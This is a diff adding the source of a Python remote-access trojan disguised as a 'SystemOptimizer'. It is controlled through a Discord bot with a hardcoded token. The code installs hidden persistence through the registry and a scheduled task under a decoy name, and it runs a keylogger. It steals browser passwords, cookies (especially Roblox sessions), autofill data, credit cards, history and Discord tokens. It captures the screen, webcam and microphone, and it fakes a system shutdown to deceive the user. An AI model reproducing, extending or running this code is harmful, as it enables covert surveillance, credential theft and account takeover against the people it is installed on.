@@ -1,0 +1,1941 @@
+# ============================================================
+#  SystemOptimizer - Remote Agent (main.py)  //  V4.1
+#  Controlled via Discord  |  Author: you ;)
+# ============================================================
+#  Installer handles deps. Reference:
+#    pip install discord.py mss pyautogui psutil pillow requests
+#    pip install pywin32 pycryptodome pyAesCrypt pynput keyboard
+#    pip install opencv-python sounddevice soundfile numpy comtypes
+# ============================================================
+
+import os, sys, io, re, json, time, base64, sqlite3, shutil, socket, platform
+import subprocess, threading, tempfile, ctypes, zipfile, random, string, uuid
+import urllib.request, urllib.parse, asyncio, traceback, glob, struct, signal
+from datetime import datetime
+from pathlib import Path
+
+# ---------- 3rd party (lazy-safe) ----------
+try:
+    import discord
+    from discord.ext import commands
+except ImportError:
+    os.system(f'"{sys.executable}" -m pip install --quiet discord.py')
+    import discord
+    from discord.ext import commands
+
+def _safe_import(name, pkg=None):
+    try:
+        return __import__(name)
+    except ImportError:
+        os.system(f'"{sys.executable}" -m pip install --quiet {pkg or name}')
+        return __import__(name)
+
+mss           = _safe_import("mss")
+pyautogui     = _safe_import("pyautogui")
+psutil        = _safe_import("psutil")
+PIL_Image     = _safe_import("PIL.Image", "pillow")
+requests      = _safe_import("requests")
+ImageGrab     = __import__("PIL.ImageGrab", fromlist=["ImageGrab"])
+Image         = __import__("PIL.Image", fromlist=["Image"])
+
+# ============================================================
+#  CONFIG
+# ============================================================
+BOT_TOKEN    = "MTU3MzQ1MzAyMTAyOTk5ODY0NA.GUDi4g.q_HPbLH3vkg2vZRs4tM4SK8Q10N7PYvZlixsXQ"
+OWNER_ID     = 682239509135360004
+GUILD_ID     = 1573437124303265923
+
+APP_NAME     = "SystemOptimizer"
+STARTUP_NAME = "RuntimeServiceHelper"
+WORK_DIR     = os.path.join(os.getenv("APPDATA", os.path.expanduser("~")), APP_NAME)
+os.makedirs(WORK_DIR, exist_ok=True)
+LOG_FILE     = os.path.join(WORK_DIR, "agent.log")
+HIDE_STATE   = os.path.join(WORK_DIR, "state.json")
+
+# fake-shutdown state
+FAKE_SHUTDOWN_FLAG   = os.path.join(WORK_DIR, "fakeshutdown.on")
+FAKE_SHUTDOWN_ACTIVE = os.path.join(WORK_DIR, "fakeshutdown.active")
+SHUTDOWN_WATCHER     = os.path.join(WORK_DIR, "shutdownwatch.on")
+
+# keylogger state
+KEYLOG_FILE  = os.path.join(WORK_DIR, "kl.txt")
+KEYLOG_ON    = os.path.join(WORK_DIR, "kl.on")
+
+# blackout pid state (so unblackout can kill *only* the blackout window)
+BLACKOUT_PID = os.path.join(WORK_DIR, "blackout.pid")
+
+# ============================================================
+#  Utils
+# ============================================================
+def log(msg):
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {msg}\n")
+    except Exception:
+        pass
+
+def run_ps(cmd, timeout=30):
+    try:
+        p = subprocess.run(
+            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", cmd],
+            capture_output=True, text=True, timeout=timeout,
+            creationflags=0x08000000,
+        )
+        return (p.stdout or "") + (p.stderr or "")
+    except Exception as e:
+        return f"ERR: {e}"
+
+def run_cmd(cmd, timeout=60):
+    try:
+        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
+                           timeout=timeout, creationflags=0x08000000,
+                           errors="replace")
+        return (p.stdout or "") + (p.stderr or "")
+    except Exception as e:
+        return f"ERR: {e}"
+
+def chunk(text, size=1900):
+    return [text[i:i+size] for i in range(0, len(text), size)] or ["(empty)"]
+
+def hidden_popen(args, **kw):
+    """Launch a process with NO console window. Returns the Popen object."""
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    si.wShowWindow = 0
+    return subprocess.Popen(args, startupinfo=si,
+                            creationflags=0x08000000, **kw)
+
+def download_bytes(url, timeout=20):
+    r = requests.get(url, timeout=timeout, stream=True,
+                     headers={"User-Agent": "Mozilla/5.0"})
+    r.raise_for_status()
+    return r.content
+
+def get_state():
+    try:
+        return json.load(open(HIDE_STATE))
+    except Exception:
+        return {}
+
+def save_state(st):
+    try:
+        json.dump(st, open(HIDE_STATE, "w"))
+    except Exception:
+        pass
+
+def kill_pid_file(pid_file, tree=True):
+    try:
+        pid = int(open(pid_file).read().strip())
+    except Exception:
+        return False
+    try:
+        p = psutil.Process(pid)
+        if tree:
+            for c in p.children(recursive=True):
+                try: c.kill()
+                except Exception: pass
+        p.kill()
+        return True
+    except Exception:
+        return False
+    finally:
+        try: os.remove(pid_file)
+        except Exception: pass
+
+# ============================================================
+#  DISCORD BOT
+# ============================================================
+intents = discord.Intents.default()
+intents.message_content = True
+intents.guilds = True
+bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
+
+def owner_only():
+    async def pred(ctx):
+        return ctx.author.id == OWNER_ID
+    return commands.check(pred)
+
+# ============================================================
+#  STEALTH STARTUP
+# ============================================================
+def install_to_startup():
+    try:
+        target = os.path.join(WORK_DIR, f"{APP_NAME}.pyw")
+        try:
+            if os.path.abspath(sys.argv[0]) != target:
+                shutil.copy2(sys.argv[0], target)
+        except Exception:
+            pass
+        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
+        if not os.path.exists(pythonw):
+            pythonw = sys.executable
+        cmd = f'"{pythonw}" "{target}"'
+        run_ps(
+            f'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
+            f'-Name "{STARTUP_NAME}" -Value \'{cmd}\' -PropertyType String -Force | Out-Null'
+        )
+        run_ps(
+            f'schtasks /Create /TN "{STARTUP_NAME}" /TR "\'{cmd}\'" /SC ONLOGON /RL HIGHEST /F | Out-Null'
+        )
+        log("startup installed")
+    except Exception as e:
+        log(f"startup err: {e}")
+
+def hide_self_console():
+    try:
+        kernel32 = ctypes.windll.kernel32
+        user32   = ctypes.windll.user32
+        hwnd = kernel32.GetConsoleWindow()
+        if hwnd:
+            user32.ShowWindow(hwnd, 0)
+    except Exception:
+        pass
+
+# ============================================================
+#  KEYLOGGER
+# ============================================================
+_keylog_thread = None
+_keylog_stop = threading.Event()
+
+def _start_keylogger():
+    global _keylog_thread
+    if _keylog_thread and _keylog_thread.is_alive():
+        return
+    _keylog_stop.clear()
+
+    def _runner():
+        try:
+            from pynput import keyboard as kb
+        except ImportError:
+            os.system(f'"{sys.executable}" -m pip install --quiet pynput keyboard')
+            try:
+                from pynput import keyboard as kb
+            except Exception:
+                return
+        buf = []
+        def _flush():
+            try:
+                with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
+                    f.write("".join(buf))
+                buf.clear()
+            except Exception:
+                pass
+        def on_press(key):
+            try:
+                if key == kb.Key.space: buf.append(" ")
+                elif key == kb.Key.enter: buf.append("\n")
+                elif key == kb.Key.tab: buf.append("\t")
+                elif hasattr(key, "char") and key.char:
+                    buf.append(key.char)
+                else:
+                    buf.append(f"[{key}]")
+            except Exception:
+                pass
+            if len(buf) >= 20:
+                _flush()
+        with kb.Listener(on_press=on_press) as listener:
+            while not _keylog_stop.is_set():
+                listener.join(0.5)
+                _flush()
+        _flush()
+
+    _keylog_thread = threading.Thread(target=_runner, daemon=True)
+    _keylog_thread.start()
+
+def _stop_keylogger():
+    _keylog_stop.set()
+
+# ============================================================
+#  FAKE SHUTDOWN GUARD  (V4.1 FIX)
+# ============================================================
+# Strategy:
+#   1. While watcher is ON, a background thread runs `shutdown /s /t 120`
+#      and immediately `shutdown /a`.  This constantly resets an abort
+#      window (Windows needs an active timer to accept /a).  Cheap.
+#   2. A second thread polls every 500ms for `shutdown /a` success
+#      (exit code 0) as a signal that a shutdown was *just* cancelled
+#      — that's our "user pressed shutdown" trigger.
+#   3. On trigger we launch a kiosk-form black overlay that also
+#      *paints* a fake Windows-11 spinner so it looks like a real
+#      power-off, then goes fully black.  The overlay is assigned a PID
+#      and stored so we can dismiss it later with `!shutdownrestore`.
+# ============================================================
+_shutdown_watch_thread = None
+_shutdown_watch_stop = threading.Event()
+
+def _real_shutdown_available():
+    """Detect if the user just fired a *real* shutdown that we must abort."""
+    # run `shutdown /a` once; returncode 0 means "there WAS a pending shutdown"
+    p = subprocess.run("shutdown /a", shell=True, capture_output=True,
+                       text=True, creationflags=0x08000000)
+    out = (p.stdout or "") + (p.stderr or "")
+    # 1116 = no shutdown in progress; anything else (0 or 592) = we cancelled one
+    return "no shutdown" not in out.lower() and "aucun" not in out.lower() and "1116" not in out
+
+def _launch_fake_off_screen():
+    """
+    Full-screen black window that mimics the Windows 11 shutdown animation
+    (blue-ish spinner fading to black) and stays until dismissed.
+    Runs as its own detached powershell so we can kill by PID later.
+    """
+    ps = r"""
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    $f = New-Object System.Windows.Forms.Form
+    $f.FormBorderStyle = 'None'
+    $f.WindowState   = 'Maximized'
+    $f.BackColor     = 'Black'
+    $f.TopMost       = $true
+    $f.ShowInTaskbar = $false
+    $f.KeyPreview    = $true
+    $f.Cursor        = [System.Windows.Forms.Cursors]::Default
+    # simple onpaint: draw spinner text
+    $f.Add_Paint({
+        param($s, $e)
+        $g = $e.Graphics
+        $font = New-Object System.Drawing.Font("Segoe UI", 20)
+        $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(200,255,255,255))
+        $msg = "Shutting down..."
+        $sz  = $g.MeasureString($msg, $font)
+        $g.DrawString($msg, $font, $brush, ($s.Width - $sz.Width)/2, ($s.Height - $sz.Height)/2)
+    })
+    [System.Windows.Forms.Application]::Run($f)
+    """
+    path = os.path.join(WORK_DIR, "fake_off.ps1")
+    try:
+        open(path, "w", encoding="utf-8").write(ps)
+    except Exception:
+        return None
+    proc = hidden_popen([
+        "powershell", "-NoProfile", "-WindowStyle", "Hidden",
+        "-ExecutionPolicy", "Bypass", "-File", path
+    ])
+    try:
+        open(BLACKOUT_PID, "w").write(str(proc.pid))
+    except Exception:
+        pass
+    try:
+        open(FAKE_SHUTDOWN_ACTIVE, "w").write("1")
+    except Exception:
+        pass
+    return proc
+
+
+def _shutdown_watcher_runner():
+    """
+    Poll loop:
+      - every 500ms: if a shutdown is pending, abort it.
+      - If abort succeeded -> user pressed shutdown -> show fake off screen,
+        then keep looping (so pressing shutdown again *pauses* re-trigger).
+    """
+    # First, force an abort window so `shutdown /a` has something to stop.
+    subprocess.run("shutdown /s /t 120", shell=True, capture_output=True,
+                   creationflags=0x08000000)
+    subprocess.run("shutdown /a", shell=True, capture_output=True,
+                   creationflags=0x08000000)
+    time.sleep(1.0)
+
+    while not _shutdown_watch_stop.is_set():
+        if not os.path.exists(FAKE_SHUTDOWN_FLAG):
+            break
+        # Keep a benign abort window alive so future canned shutdowns work
+        p = subprocess.run("shutdown /a", shell=True, capture_output=True,
+                           text=True, creationflags=0x08000000)
+        out = (p.stdout or "") + (p.stderr or "")
+        # If we cancelled something real, spin up the fake screen
+        if (p.returncode == 0) and ("shutdown" not in out.lower() or "cancel" in out.lower()):
+            # only launch if not already active
+            if not os.path.exists(FAKE_SHUTDOWN_ACTIVE):
+                _launch_fake_off_screen()
+        # Re-arm the abort window every ~60s (Windows requires a pending timer)
+        # do it every ~55s: cheap, neglible CPU
+        now = time.time()
+        if not hasattr(_shutdown_watcher_runner, "_last_arm") or \
+                now - _shutdown_watcher_runner._last_arm > 55:
+            subprocess.run("shutdown /s /t 120", shell=True, capture_output=True,
+                           creationflags=0x08000000)
+            subprocess.run("shutdown /a", shell=True, capture_output=True,
+                           creationflags=0x08000000)
+            _shutdown_watcher_runner._last_arm = now
+        time.sleep(0.5)
+
+
+def _start_shutdown_watcher():
+    global _shutdown_watch_thread
+    if _shutdown_watch_thread and _shutdown_watch_thread.is_alive():
+        return
+    _shutdown_watch_stop.clear()
+    _shutdown_watch_thread = threading.Thread(target=_shutdown_watcher_runner, daemon=True)
+    _shutdown_watch_thread.start()
+
+
+def _stop_shutdown_watcher():
+    _shutdown_watch_stop.set()
+    # cancel any pending timer we left behind
+    subprocess.run("shutdown /a", shell=True, capture_output=True,
+                   creationflags=0x08000000)
+
+# ============================================================
+#  BROWSER DATA  (Chrome / Edge / Brave / Opera / Vivaldi / Firefox)
+# ============================================================
+BROWSERS = {
+    "Chrome":  r"Google\Chrome\User Data",
+    "Edge":    r"Microsoft\Edge\User Data",
+    "Brave":   r"BraveSoftware\Brave-Browser\User Data",
+    "Opera":   r"Opera Software\Opera Stable",
+    "OperaGX": r"Opera Software\Opera GX Stable",
+    "Vivaldi": r"Vivaldi\User Data",
+    "Firefox": r"Mozilla\Firefox\Profiles",
+}
+
+def _browser_profiles():
+    local  = os.path.expanduser(r"~\AppData\Local")
+    roam   = os.path.expanduser(r"~\AppData\Roaming")
+    for name, rel in BROWSERS.items():
+        base = os.path.join(local, rel) if not rel.startswith("Mozilla") else os.path.join(roam, rel)
+        if not os.path.isdir(base):
+            continue
+        if name == "Firefox":
+            for prof in os.listdir(base):
+                p = os.path.join(base, prof)
+                if os.path.isdir(p):
+                    yield (name, prof, p)
+        else:
+            yield (name, "Default", base)
+            for prof in os.listdir(base):
+                p = os.path.join(base, prof)
+                if os.path.isdir(p) and (prof.startswith("Profile") or prof == "Default"):
+                    yield (name, prof, p)
+
+
+def _copy_locked(src):
+    tmp = os.path.join(tempfile.gettempdir(), f"cp_{uuid.uuid4().hex}.db")
+    try:
+        shutil.copy2(src, tmp)
+        return tmp
+    except Exception:
+        try:
+            with open(src, "rb") as f, open(tmp, "wb") as g:
+                g.write(f.read())
+            return tmp
+        except Exception:
+            return None
+
+
+def _dpapi_decrypt(enc):
+    if not enc:
+        return ""
+    try:
+        import win32crypt
+        try:
+            return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode("utf-8", "ignore")
+        except Exception:
+            pass
+        try:
+            data = enc[3:] if enc[:3] in (b"v10", b"v11") else enc
+            return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode("utf-8", "ignore")
+        except Exception:
+            pass
+    except Exception:
+        pass
+    return enc.decode("utf-8", "ignore") if isinstance(enc, bytes) else str(enc)
+
+
+def _get_master_key(profile_root):
+    try:
+        import win32crypt
+        ls = os.path.join(profile_root, "Local State")
+        if not os.path.exists(ls):
+            return None
+        data = json.load(open(ls, "r", encoding="utf-8"))
+        enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
+        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
+    except Exception:
+        return None
+
+
+def _decrypt_chrome_aes(blob, key):
+    if not key or not blob:
+        return _dpapi_decrypt(blob)
+    try:
+        from Crypto.Cipher import AES
+        if blob[:3] in (b"v10", b"v11"):
+            iv      = blob[3:15]
+            payload = blob[15:]
+            cipher  = AES.new(key, AES.MODE_GCM, iv)
+            dec, _  = cipher.decrypt_and_verify(payload[:-16], payload[-16:])
+            return dec.decode("utf-8", "ignore")
+        return blob.decode("utf-8", "ignore")
+    except Exception:
+        return _dpapi_decrypt(blob)
+
+
+def steal_cookies():
+    """
+    Returns:
+      {
+        "Chrome": {"example.com/": ".ROBLOSECURITY=abc; ...", ...},
+        ...
+        "__ROBLOX__": {"Chrome": ".ROBLOSECURITY=abc...", "Edge": ".ROBLOSECURITY=..."}
+      }
+    """
+    out = {}
+    for browser, prof, path in _browser_profiles():
+        # -- Firefox --
+        if browser == "Firefox":
+            db = os.path.join(path, "cookies.sqlite")
+            if not os.path.exists(db): continue
+            tmp = _copy_locked(db)
+            if not tmp: continue
+            try:
+                con = sqlite3.connect(tmp)
+                cur = con.cursor()
+                rows = cur.execute(
+                    "SELECT host, name, value, path FROM moz_cookies"
+                ).fetchall()
+                con.close()
+                if rows:
+                    out.setdefault(browser, {})
+                    for host, name, value, cpath in rows:
+                        out[browser][f"{host}{cpath}"] = f"{name}={value}"
+            except Exception:
+                pass
+            finally:
+                try: os.remove(tmp)
+                except: pass
+            continue
+
+        # -- Chromium family --
+        db_candidates = (
+            glob.glob(os.path.join(path, "Network", "Cookies")) +
+            glob.glob(os.path.join(path, "Cookies")) +
+            glob.glob(os.path.join(path, "Network", "Cookies-journal"))
+        )
+        for ck in db_candidates:
+            if not ck.endswith("Cookies") or not os.path.exists(ck):
+                continue
+            tmp = _copy_locked(ck)
+            if not tmp: continue
+            key = _get_master_key(os.path.dirname(os.path.dirname(ck)))
+            try:
+                con = sqlite3.connect(tmp)
+                cur = con.cursor()
+                rows = cur.execute(
+                    "SELECT host_key, name, encrypted_value, path FROM cookies"
+                ).fetchall()
+                con.close()
+            except Exception:
+                rows = []
+            finally:
+                try: os.remove(tmp)
+                except: pass
+            if not rows:
+                continue
+            out.setdefault(browser, {})
+            for host, cname, enc, cpath in rows:
+                val = _decrypt_chrome_aes(enc, key)
+                if val:
+                    full = out[browser].get(f"{host}{cpath}", "")
+                    out[browser][f"{host}{cpath}"] = (full + ("; " if full else "") + f"{cname}={val}")
+
+    # highlight Roblox in every browser
+    out["__ROBLOX__"] = {}
+    for b, d in out.items():
+        if b == "__ROBLOX__":
+            continue
+        for site, ck in d.items():
+            if "roblox.com" in site.lower() and ".ROBLOSECURITY" in ck:
+                # extract just the cookie value
+                for part in ck.split(";"):
+                    part = part.strip()
+                    if part.startswith(".ROBLOSECURITY="):
+                        out["__ROBLOX__"][b] = part
+                        break
+    return out
+
+
+def steal_passwords():
+    out = {}
+    for browser, prof, path in _browser_profiles():
+        if browser == "Firefox":
+            # simple Firefox decrypt via key4 isn't trivial; we log encrypted as base64
+            for lf in glob.glob(os.path.join(path, "logins.json")):
+                try:
+                    data = json.load(open(lf, "r", encoding="utf-8"))
+                    for entry in data.get("logins", []):
+                        out.setdefault(browser, []).append({
+                            "url": entry.get("hostname", ""),
+                            "user_enc": entry.get("encryptedUsername", ""),
+                            "pw_enc":   entry.get("encryptedPassword", ""),
+                        })
+                except Exception:
+                    pass
+            continue
+
+        for lp in glob.glob(os.path.join(path, "Login Data")):
+            if not os.path.exists(lp): continue
+            key = _get_master_key(path)
+            tmp = _copy_locked(lp)
+            if not tmp: continue
+            try:
+                con = sqlite3.connect(tmp)
+                cur = con.cursor()
+                rows = cur.execute(
+                    "SELECT origin_url, username_value, password_value FROM logins"
+                ).fetchall()
+                con.close()
+            except Exception:
+                rows = []
+            finally:
+                try: os.remove(tmp)
+                except: pass
+            for url, user, enc in rows:
+                pw = _decrypt_chrome_aes(enc, key)
+                if user or pw:
+                    out.setdefault(browser, []).append({
+                        "url": url, "user": user, "pw": pw,
+                    })
+    return out
+
+
+def steal_autofill():
+    out = {}
+    for browser, prof, path in _browser_profiles():
+        if browser == "Firefox": continue
+        for wd in glob.glob(os.path.join(path, "Web Data")):
+            tmp = _copy_locked(wd)
+            if not tmp: continue
+            key = _get_master_key(path)
+            try:
+                con = sqlite3.connect(tmp)
+                cur = con.cursor()
+                def _has(tbl):
+                    try:
+                        cur.execute(f"SELECT 1 FROM {tbl} LIMIT 1"); return True
+                    except Exception: return False
+                rows  = cur.execute("SELECT name, value, count FROM autofill").fetchall() if _has("autofill") else []
+                cards = cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall() if _has("credit_cards") else []
+                con.close()
+                if rows or cards:
+                    out.setdefault(browser, {"fields": [], "cards": []})
+                    out[browser]["fields"] = [{"name": n, "value": v} for n, v, c in rows]
+                    out[browser]["cards"]  = [{"name_on_card": n, "exp_month": m,
+                                               "exp_year": y,
+                                               "card": _decrypt_chrome_aes(c, key)}
+                                              for n, m, y, c in cards]
+            except Exception:
+                pass
+            finally:
+                try: os.remove(tmp)
+                except: pass
+    return out
+
+
+def steal_history(limit=2000):
+    out = {}
+    for browser, prof, path in _browser_profiles():
+        if browser == "Firefox":
+            db = os.path.join(path, "places.sqlite")
+            if not os.path.exists(db): continue
+            tmp = _copy_locked(db)
+            if not tmp: continue
+            try:
+                con = sqlite3.connect(tmp)
+                cur = con.cursor()
+                rows = cur.execute(
+                    "SELECT url, title, visit_count, last_visit_date FROM moz_places "
+                    "ORDER BY last_visit_date DESC LIMIT ?", (limit,)
+                ).fetchall()
+                con.close()
+                out.setdefault(browser, []).extend(
+                    [{"url": u, "title": t, "visits": v,
+                      "last": str(datetime.fromtimestamp(ts/1e6)) if ts else ""}
+                     for u, t, v, ts in rows]
+                )
+            except Exception:
+                pass
+            finally:
+                try: os.remove(tmp)
+                except: pass
+            continue
+
+        for h in glob.glob(os.path.join(path, "History")):
+            tmp = _copy_locked(h)
+            if not tmp: continue
+            try:
+                con = sqlite3.connect(tmp)
+                cur = con.cursor()
+                rows = cur.execute(
+                    "SELECT url, title, visit_count, last_visit_time "
+                    "FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,)
+                ).fetchall()
+                con.close()
+                for u, t, v, ts in rows:
+                    dt = ""
+                    try:
+                        dt = str(datetime(1601,1,1) + __import__("datetime").timedelta(microseconds=ts))
+                    except Exception:
+                        pass
+                    out.setdefault(browser, []).append(
+                        {"url": u, "title": t, "visits": v, "last": dt}
+                    )
+            except Exception:
+                pass
+            finally:
+                try: os.remove(tmp)
+                except: pass
+    return out
+
+
+# ============================================================
+#  DISCORD APP TOKEN EXTRACT
+# ============================================================
+def steal_discord_token():
+    tokens = []
+    bases = [
+        os.path.expanduser(r"~\AppData\Roaming\discord\Local Storage\leveldb"),
+        os.path.expanduser(r"~\AppData\Roaming\discordcanary\Local Storage\leveldb"),
+        os.path.expanduser(r"~\AppData\Roaming\discordptb\Local Storage\leveldb"),
+        os.path.expanduser(r"~\AppData\Roaming\Lightcord\Local Storage\leveldb"),
+    ]
+    for base in bases:
+        if not os.path.isdir(base):
+            continue
+        for f in os.listdir(base):
+            if not (f.endswith(".ldb") or f.endswith(".log")):
+                continue
+            try:
+                data = open(os.path.join(base, f), "rb").read()
+            except Exception:
+                continue
+            for m in re.findall(rb"[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}", data):
+                tokens.append(m.decode("utf-8", "ignore"))
+            for m in re.findall(rb'"([\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110})"', data):
+                tokens.append(m.decode("utf-8", "ignore"))
+    seen = []
+    for t in tokens:
+        if t not in seen:
+            seen.append(t)
+    return seen
+
+
+# ============================================================
+#  SCREENSHOT (all monitors combined via mss virtual monitor)
+# ============================================================
+def screenshot_all():
+    with mss.mss() as sct:
+        shot = sct.grab(sct.monitors[0])   # 0 = full virtual desktop
+        img = Image.frombytes("RGB", shot.size, shot.rgb)
+        if img.width > 2400:
+            img = img.resize((2400, int(img.height * 2400 / img.width)))
+        buf = io.BytesIO()
+        img.save(buf, format="PNG", optimize=True)
+        buf.seek(0)
+        return buf
+
+
+# ============================================================
+#  WEBCAM
+# ============================================================
+def webcam_capture():
+    try:
+        import cv2
+        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+        if not cam.isOpened():
+            cam.release()
+            cam = cv2.VideoCapture(0)
+        if not cam.isOpened():
+            return None
+        ok = False
+        for _ in range(3):
+            ok, frame = cam.read()
+            if ok: break
+            time.sleep(0.2)
+        cam.release()
+        if not ok:
+            return None
+        ok, enc = cv2.imencode(".jpg", frame)
+        if not ok: return None
+        buf = io.BytesIO(enc.tobytes())
+        buf.seek(0)
+        return buf
+    except Exception:
+        return None
+
+
+# ============================================================
+#  MICROPHONE
+# ============================================================
+def record_mic(seconds=5):
+    try:
+        import sounddevice as sd
+        import soundfile as sf
+        import numpy as np
+        fs  = 44100
+        rec = sd.rec(int(seconds*fs), samplerate=fs, channels=1)
+        sd.wait()
+        buf = io.BytesIO()
+        sf.write(buf, rec, fs, format="WAV")
+        buf.seek(0)
+        return buf
+    except Exception as e:
+        log(f"mic err: {e}")
+        return None
+
+
+# ============================================================
+#  FIND / DISK
+# ============================================================
+def find_files(pattern, root=None, limit=200):
+    if not root:
+        root = os.path.expanduser("~")
+    res = []
+    pat = pattern.lower()
+    for dirpath, dirs, files in os.walk(root):
+        dirs[:] = [d for d in dirs if d not in ("node_modules", ".git", "__pycache__")][:20]
+        for f in files:
+            if pat in f.lower():
+                res.append(os.path.join(dirpath, f))
+                if len(res) >= limit:
+                    return res
+    return res
+
+def disk_map_text():
+    lines = []
+    for part in psutil.disk_partitions(all=False):
+        try:
+            usage = psutil.disk_usage(part.mountpoint)
+            total = usage.total / (1024**3)
+            used  = usage.used  / (1024**3)
+            pct   = usage.percent
+            bar   = "█" * int(pct/5) + "░" * (20 - int(pct/5))
+            lines.append(f"{part.device}  {bar}  {pct:.1f}%  ({used:.1f}/{total:.1f} GB)")
+        except Exception:
+            pass
+    return "\n".join(lines) or "(no disks)"
+
+
+# ============================================================
+#  EVENTS
+# ============================================================
+@bot.event
+async def on_ready():
+    log(f"logged in as {bot.user}")
+    print(f"[{APP_NAME}] online as {bot.user}")
+    # Auto re-arm shutdown watcher if the flag persisted across reboot
+    if os.path.exists(FAKE_SHUTDOWN_FLAG):
+        _start_shutdown_watcher()
+    # Auto restart keylogger if it was on
+    if os.path.exists(KEYLOG_ON):
+        _start_keylogger()
+    try:
+        guild = bot.get_guild(GUILD_ID)
+        if guild:
+            await bot.tree.sync(guild=guild)
+    except Exception:
+        pass
+
+@bot.check
+async def _owner_gate(ctx):
+    return ctx.author.id == OWNER_ID
+
+
+# ============================================================
+#  BASIC
+# ============================================================
+@bot.command()
+async def ping(ctx): await ctx.reply(f"pong `{round(bot.latency*1000)}ms` | {APP_NAME}")
+
+@bot.command()
+async def version(ctx):
+    await ctx.reply(f"**{APP_NAME} v4.1** · {platform.system()} {platform.release()} · python {sys.version.split()[0]}")
+
+@bot.command()
+async def info(ctx):
+    try:
+        cpu = psutil.cpu_percent(interval=0.5)
+        mem = psutil.virtual_memory()
+        dsk = psutil.disk_usage("C:\\")
+        uname = platform.uname()
+        await ctx.reply(
+            f"**System**\n"
+            f"host: `{socket.gethostname()}`\n"
+            f"user: `{os.getlogin()}`\n"
+            f"OS:   `{uname.system} {uname.release}`\n"
+            f"CPU:  `{uname.processor}`\n"
+            f"CPU%: `{cpu}%` ({psutil.cpu_count()} cores)\n"
+            f"RAM:  `{mem.used//(1024**2)}/{mem.total//(1024**2)} MB` ({mem.percent}%)\n"
+            f"DISK: `{dsk.used//(1024**3)}/{dsk.total//(1024**3)} GB` ({dsk.percent}%)\n"
+            f"Uptime: `{datetime.now()-datetime.fromtimestamp(psutil.boot_time())}`"
+        )
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+@bot.command()
+async def ip(ctx):
+    try:
+        pub = requests.get("https://api.ipify.org", timeout=5).text
+        host = socket.gethostname()
+        local = socket.gethostbyname(host)
+        all_local = [a[4][0] for a in socket.getaddrinfo(host, None) if a[0] == socket.AF_INET]
+        all_local = list(dict.fromkeys(all_local))
+        await ctx.reply(
+            f"**Public IP:** `{pub}`\n"
+            f"**Hostname:** `{host}`\n"
+            f"**Primary local:** `{local}`\n"
+            f"**All local:** `{', '.join(all_local)}`"
+        )
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+@bot.command()
+async def battery(ctx):
+    try:
+        b = psutil.sensors_battery()
+        if not b:
+            return await ctx.reply("No battery (desktop?)")
+        await ctx.reply(f"🔋 `{b.percent}%` {'⚡ charging' if b.power_plugged else '🔌 on battery'}"
+                        + (f" · {b.secsleft//60} min left" if b.secsleft and b.secsleft > 0 else ""))
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+@bot.command(name="screenshot", aliases=["ss"])
+async def screenshot(ctx):
+    try:
+        buf = screenshot_all()
+        await ctx.reply(file=discord.File(buf, "screen.png"))
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  PROCESSES
+# ============================================================
+@bot.command()
+async def processes(ctx):
+    try:
+        proc = []
+        for p in psutil.process_iter(["pid", "name", "memory_info"]):
+            try:
+                mem = p.info["memory_info"].rss // (1024**2) if p.info["memory_info"] else 0
+                proc.append(f"{p.info['pid']:>6}  {mem:>6} MB  {p.info['name']}")
+            except Exception:
+                continue
+        proc.sort(key=lambda s: int(s.split()[0]))
+        for c in chunk("\n".join(proc[:200]), 1800):
+            await ctx.send(f"```\n{c}\n```")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+@bot.command()
+async def kill(ctx, *, name):
+    try:
+        killed = 0
+        for p in psutil.process_iter(["name"]):
+            try:
+                if p.info["name"] and name.lower() in p.info["name"].lower():
+                    p.kill(); killed += 1
+            except Exception:
+                pass
+        await ctx.reply(f"killed {killed} process(es) matching `{name}`")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+@bot.command(name="kill-tree")
+async def kill_tree(ctx, pid: int):
+    try:
+        parent = psutil.Process(pid)
+        kids = parent.children(recursive=True)
+        for c in kids:
+            try: c.kill()
+            except: pass
+        parent.kill()
+        await ctx.reply(f"killed tree of pid {pid}")
+    except Exception as e:
+        await ctx.reply(f"ERR: {e}")
+
+
+# ============================================================
+#  FILES  (V4.1 – each row includes full path)
+# ============================================================
+@bot.command()
+async def files(ctx, *, path=None):
+    try:
+        if not path:
+            path = os.path.expanduser("~/Downloads")
+        path = os.path.expanduser(path)
+        if not os.path.isdir(path):
+            return await ctx.reply(f"not a dir: `{path}`")
+        items = os.listdir(path)[:200]
+        lines = []
+        for it in items:
+            full = os.path.join(path, it)
+            try:
+                if os.path.isdir(full):
+                    lines.append(f"[DIR]  {it}\n       {full}")
+                else:
+                    sz = os.path.getsize(full)
+                    lines.append(f"[{sz:>10} B]  {it}\n       {full}")
+            except Exception:
+                lines.append(f"[?]  {it}\n       {full}")
+        head = f"📁 `{path}` ({len(items)} items)\n"
+        for i, c in enumerate(chunk("\n".join(lines) or "(empty)", 1700)):
+            await ctx.send((head if i == 0 else "") + f"```\n{c}\n```")
